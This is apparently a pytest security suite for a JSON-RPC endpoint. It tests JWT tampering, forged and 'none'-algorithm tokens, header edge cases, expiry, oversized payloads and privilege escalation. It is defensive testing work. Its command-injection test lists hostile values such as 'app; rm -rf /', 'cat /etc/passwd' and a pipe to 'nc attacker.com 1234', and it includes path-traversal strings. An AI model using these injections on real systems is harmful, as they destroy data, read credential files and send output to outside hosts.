# Copyright (c) 2025, Abilian SAS
#
# SPDX-License-Identifier: Apache-2.0

"""Comprehensive RPC endpoint security tests.

This module tests various attack vectors against the RPC endpoint:
- Authentication bypass attempts
- Token manipulation and tampering
- Privilege escalation attempts
- Command injection
- SQL injection
- Path traversal
- Authorization header edge cases
"""

from __future__ import annotations

import base64
import json
import os
from datetime import UTC, datetime, timedelta

import jwt
import pytest
from litestar.testing import TestClient

from hop3.server.asgi import create_app
from hop3.server.security.tokens import create_token


@pytest.fixture(autouse=True)
def setup_security_test_env(monkeypatch):
    """Set up test environment with authentication enabled."""
    # Set required secrets without needing to reload config
    monkeypatch.setenv("HOP3_SECRET_KEY", "test-security-secret-key-for-tests")
    monkeypatch.setenv("HOP3_ENABLE_AUTH", "true")


@pytest.fixture
def client():
    """Create a test client."""
    app = create_app()
    return TestClient(app)


@pytest.fixture
def valid_token():
    """Create a valid authentication token."""
    return create_token("testuser", scopes=["authenticated"])


@pytest.fixture
def secret_key():
    """Get the secret key used for token signing."""
    return os.environ["HOP3_SECRET_KEY"]


# ============================================================================
# Token Tampering Tests
# ============================================================================


def test_tampered_token_payload(client: TestClient, valid_token: str, secret_key: str):
    """Test that tampering with token payload is detected."""
    # Decode the valid token to tamper with it
    parts = valid_token.split(".")
    assert len(parts) == 3, "JWT should have 3 parts"

    # Decode the payload (middle part)
    payload_bytes = base64.urlsafe_b64decode(parts[1] + "==")
    payload = json.loads(payload_bytes)

    # Tamper with the payload - try to escalate to admin
    payload["scopes"] = ["authenticated", "admin"]
    payload["sub"] = "admin"

    # Re-encode the payload
    tampered_payload = (
        base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")
    )

    # Create tampered token with original signature (should fail verification)
    tampered_token = f"{parts[0]}.{tampered_payload}.{parts[2]}"

    response = client.post(
        "/rpc",
        json={
            "jsonrpc": "2.0",
            "method": "cli",
            "params": {"cli_args": ["app", "list"], "extra_args": {}},
            "id": 1,
        },
        headers={"Authorization": f"Bearer {tampered_token}"},
    )

    # Should be rejected due to signature mismatch
    assert response.status_code == 401


def test_token_signed_with_wrong_key(client: TestClient):
    """Test that tokens signed with a different key are rejected."""
    # Create a token with a different secret key
    wrong_secret = "wrong-secret-key-for-testing-12345"
    payload = {
        "sub": "attacker",
        "exp": datetime.now(UTC) + timedelta(hours=1),
        "scopes": ["authenticated", "admin"],
    }
    malicious_token = jwt.encode(payload, wrong_secret, algorithm="HS256")

    response = client.post(
        "/rpc",
        json={
            "jsonrpc": "2.0",
            "method": "cli",
            "params": {"cli_args": ["app", "list"], "extra_args": {}},
            "id": 1,
        },
        headers={"Authorization": f"Bearer {malicious_token}"},
    )

    # Should be rejected due to signature verification failure
    assert response.status_code == 401


def test_token_with_none_algorithm(client: TestClient):
    """Test that tokens with 'none' algorithm are rejected (CVE-2015-9235)."""
    # Try to create a token with no signature ("none" algorithm attack)
    exp_timestamp = int((datetime.now(UTC) + timedelta(hours=1)).timestamp())
    payload = {
        "sub": "attacker",
        "exp": exp_timestamp,
        "scopes": ["authenticated", "admin"],
    }

    # Manually create a token with "none" algorithm
    header = (
        base64
        .urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode())
        .decode()
        .rstrip("=")
    )
    payload_encoded = (
        base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")
    )

    # Token with no signature
    malicious_token = f"{header}.{payload_encoded}."

    response = client.post(
        "/rpc",
        json={
            "jsonrpc": "2.0",
            "method": "cli",
            "params": {"cli_args": ["app", "list"], "extra_args": {}},
            "id": 1,
        },
        headers={"Authorization": f"Bearer {malicious_token}"},
    )

    # Should be rejected
    assert response.status_code == 401


# ============================================================================
# Authorization Header Edge Cases
# ============================================================================


def test_empty_authorization_header(client: TestClient):
    """Test empty Authorization header."""
    response = client.post(
        "/rpc",
        json={
            "jsonrpc": "2.0",
            "method": "cli",
            "params": {"cli_args": ["app", "list"], "extra_args": {}},
            "id": 1,
        },
        headers={"Authorization": ""},
    )

    assert response.status_code == 401


def test_authorization_header_without_bearer_prefix(
    client: TestClient, valid_token: str
):
    """Test token without 'Bearer' prefix."""
    response = client.post(
        "/rpc",
        json={
            "jsonrpc": "2.0",
            "method": "cli",
            "params": {"cli_args": ["app", "list"], "extra_args": {}},
            "id": 1,
        },
        headers={"Authorization": valid_token},  # Missing "Bearer" prefix
    )

    assert response.status_code == 401


def test_authorization_header_case_sensitivity(client: TestClient, valid_token: str):
    """Test that Authorization header handling is case-insensitive for scheme."""
    # Test with lowercase "bearer"
    response = client.post(
        "/rpc",
        json={
            "jsonrpc": "2.0",
            "method": "cli",
            "params": {"cli_args": ["app", "list"], "extra_args": {}},
            "id": 1,
        },
        headers={"Authorization": f"bearer {valid_token}"},
    )

    # Should work with lowercase (HTTP headers are case-insensitive)
    # But the scheme comparison should handle this
    assert response.status_code in {200, 401}  # Depends on implementation


def test_multiple_bearer_tokens(client: TestClient, valid_token: str):
    """Test multiple Bearer tokens in Authorization header."""
    response = client.post(
        "/rpc",
        json={
            "jsonrpc": "2.0",
            "method": "cli",
            "params": {"cli_args": ["app", "list"], "extra_args": {}},
            "id": 1,
        },
        headers={"Authorization": f"Bearer {valid_token} Bearer fake-token"},
    )

    # Should reject malformed header
    assert response.status_code == 401


def test_whitespace_in_token(client: TestClient, valid_token: str):
    """Test token with extra whitespace."""
    response = client.post(
        "/rpc",
        json={
            "jsonrpc": "2.0",
            "method": "cli",
            "params": {"cli_args": ["app", "list"], "extra_args": {}},
            "id": 1,
        },
        headers={"Authorization": f"Bearer  {valid_token}  "},  # Extra spaces
    )

    # Should handle whitespace gracefully (trim)
    assert response.status_code in {200, 401}


# ============================================================================
# Token Lifetime and Expiration Tests
# ============================================================================


def test_token_with_future_exp(client: TestClient):
    """Test token with exp claim far in the future."""
    payload = {
        "sub": "testuser",
        "exp": datetime.now(UTC) + timedelta(days=365 * 10),  # 10 years
        "scopes": ["authenticated"],
    }
    long_lived_token = jwt.encode(
        payload, os.environ["HOP3_SECRET_KEY"], algorithm="HS256"
    )

    response = client.post(
        "/rpc",
        json={
            "jsonrpc": "2.0",
            "method": "cli",
            "params": {"cli_args": ["help"], "extra_args": {}},
            "id": 1,
        },
        headers={"Authorization": f"Bearer {long_lived_token}"},
    )

    # Should work, but may want to implement max lifetime check
    assert response.status_code in {200, 401}


def test_token_without_exp_claim(client: TestClient):
    """Test token without expiration claim."""
    payload = {
        "sub": "testuser",
        "scopes": ["authenticated"],
        # No 'exp' claim
    }
    no_exp_token = jwt.encode(payload, os.environ["HOP3_SECRET_KEY"], algorithm="HS256")

    response = client.post(
        "/rpc",
        json={
            "jsonrpc": "2.0",
            "method": "cli",
            "params": {"cli_args": ["app", "list"], "extra_args": {}},
            "id": 1,
        },
        headers={"Authorization": f"Bearer {no_exp_token}"},
    )

    # Should be rejected if exp is required
    assert response.status_code == 401


def test_token_with_invalid_exp_type(client: TestClient):
    """Test token with non-numeric exp claim."""
    payload = {
        "sub": "testuser",
        "exp": "not-a-timestamp",  # Invalid type
        "scopes": ["authenticated"],
    }

    try:
        malformed_token = jwt.encode(
            payload, os.environ["HOP3_SECRET_KEY"], algorithm="HS256"
        )

        response = client.post(
            "/rpc",
            json={
                "jsonrpc": "2.0",
                "method": "cli",
                "params": {"cli_args": ["app", "list"], "extra_args": {}},
                "id": 1,
            },
            headers={"Authorization": f"Bearer {malformed_token}"},
        )

        # Should be rejected
        assert response.status_code == 401
    except Exception:
        # jwt library may reject invalid exp during encoding
        pass


# ============================================================================
# Command Injection Tests
# ============================================================================


def test_command_injection_in_app_name(client: TestClient, valid_token: str):
    """Test command injection attempt in app name."""
    malicious_app_names = [
        "app; rm -rf /",
        "app && cat /etc/passwd",
        "app | nc attacker.com 1234",
        "$(whoami)",
        "`id`",
        "app\nmalicious_command",
    ]

    for app_name in malicious_app_names:
        response = client.post(
            "/rpc",
            json={
                "jsonrpc": "2.0",
                "method": "cli",
                "params": {"cli_args": ["status", app_name], "extra_args": {}},
                "id": 1,
            },
            headers={"Authorization": f"Bearer {valid_token}"},
        )

        # Should not execute malicious commands
        # Either reject with 400/401 or safely handle
        assert response.status_code in {200, 400, 401, 404}


def test_path_traversal_in_app_name(client: TestClient, valid_token: str):
    """Test path traversal attempt in app name."""
    malicious_app_names = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32",
        "app/../../sensitive",
        "%2e%2e%2f%2e%2e%2f",  # URL encoded ../..
    ]

    for app_name in malicious_app_names:
        response = client.post(
            "/rpc",
            json={
                "jsonrpc": "2.0",
                "method": "cli",
                "params": {"cli_args": ["status", app_name], "extra_args": {}},
                "id": 1,
            },
            headers={"Authorization": f"Bearer {valid_token}"},
        )

        # Should not allow path traversal
        assert response.status_code in {200, 400, 401, 404}


# ============================================================================
# JSON-RPC Protocol Tests
# ============================================================================


def test_jsonrpc_without_method(client: TestClient, valid_token: str):
    """Test JSON-RPC request without method field."""
    try:
        response = client.post(
            "/rpc",
            json={
                "jsonrpc": "2.0",
                # Missing "method"
                "params": {"cli_args": ["app", "list"], "extra_args": {}},
                "id": 1,
            },
            headers={"Authorization": f"Bearer {valid_token}"},
        )

        # Should return JSON-RPC error or 400
        assert response.status_code in {200, 400, 500}
        if response.status_code == 200:
            data = response.json()
            assert "error" in data
    except Exception:
        # Server may reject malformed requests
        pass


def test_jsonrpc_with_invalid_version(client: TestClient, valid_token: str):
    """Test JSON-RPC request with invalid version."""
    try:
        response = client.post(
            "/rpc",
            json={
                "jsonrpc": "1.0",  # Wrong version
                "method": "cli",
                "params": {"cli_args": ["app", "list"], "extra_args": {}},
                "id": 1,
            },
            headers={"Authorization": f"Bearer {valid_token}"},
        )

        # Should handle or reject invalid version
        assert response.status_code in {200, 400, 500}
    except Exception:
        # Server may reject malformed requests
        pass


def test_jsonrpc_batch_request(client: TestClient, valid_token: str):
    """Test JSON-RPC batch request (if supported)."""
    try:
        response = client.post(
            "/rpc",
            json=[
                {
                    "jsonrpc": "2.0",
                    "method": "cli",
                    "params": {"cli_args": ["help"], "extra_args": {}},
                    "id": 1,
                },
                {
                    "jsonrpc": "2.0",
                    "method": "cli",
                    "params": {"cli_args": ["app", "list"], "extra_args": {}},
                    "id": 2,
                },
            ],
            headers={"Authorization": f"Bearer {valid_token}"},
        )

        # Should handle batch or return error
        assert response.status_code in {200, 400, 500}
    except Exception:
        # Server may not support batch requests
        pass


# ============================================================================
# Large Payload Tests
# ============================================================================


def test_extremely_large_token(client: TestClient):
    """Test handling of extremely large tokens."""
    # Create a token with huge payload
    payload = {
        "sub": "testuser",
        "exp": datetime.now(UTC) + timedelta(hours=1),
        "scopes": ["authenticated"],
        "data": "A" * 10000,  # 10KB of data
    }
    large_token = jwt.encode(payload, os.environ["HOP3_SECRET_KEY"], algorithm="HS256")

    response = client.post(
        "/rpc",
        json={
            "jsonrpc": "2.0",
            "method": "cli",
            "params": {"cli_args": ["help"], "extra_args": {}},
            "id": 1,
        },
        headers={"Authorization": f"Bearer {large_token}"},
    )

    # Should handle or reject large tokens
    assert response.status_code in {200, 401, 413}  # 413 = Payload Too Large


def test_extremely_large_json_payload(client: TestClient, valid_token: str):
    """Test handling of extremely large JSON payloads."""
    # Create a very long app name (or list of args)
    large_args = ["help"] + ["--option"] * 1000  # Many options

    try:
        response = client.post(
            "/rpc",
            json={
                "jsonrpc": "2.0",
                "method": "cli",
                "params": {
                    "cli_args": large_args,
                    "extra_args": {},
                },
                "id": 1,
            },
            headers={"Authorization": f"Bearer {valid_token}"},
        )

        # Should handle or reject large payloads
        assert response.status_code in {200, 400, 413}
    except Exception:
        # Server may have payload size limits
        pass


# ============================================================================
# Privilege Escalation Tests
# ============================================================================


def test_regular_user_cannot_access_admin_commands(client: TestClient):
    """Test that regular users cannot execute admin-only commands."""
    user_token = create_token("regularuser", scopes=["authenticated"])

    # Try to access admin commands (if any exist)
    admin_commands = [
        ["setup"],  # Server setup
        ["setup:ssh"],  # SSH setup
    ]

    for cmd in admin_commands:
        response = client.post(
            "/rpc",
            json={
                "jsonrpc": "2.0",
                "method": "cli",
                "params": {"cli_args": cmd, "extra_args": {}},
                "id": 1,
            },
            headers={"Authorization": f"Bearer {user_token}"},
        )

        # Should deny access or return appropriate error
        # 404 is acceptable for commands that don't exist
        assert response.status_code in {200, 401, 403, 404}


def test_token_with_invalid_scopes(client: TestClient):
    """Test token with non-existent/invalid scopes."""
    payload = {
        "sub": "testuser",
        "exp": datetime.now(UTC) + timedelta(hours=1),
        "scopes": ["invalid-scope", "another-fake-scope"],
    }
    invalid_scope_token = jwt.encode(
        payload, os.environ["HOP3_SECRET_KEY"], algorithm="HS256"
    )

    response = client.post(
        "/rpc",
        json={
            "jsonrpc": "2.0",
            "method": "cli",
            "params": {"cli_args": ["app", "list"], "extra_args": {}},
            "id": 1,
        },
        headers={"Authorization": f"Bearer {invalid_scope_token}"},
    )

    # Should reject tokens without proper scopes
    assert response.status_code == 401
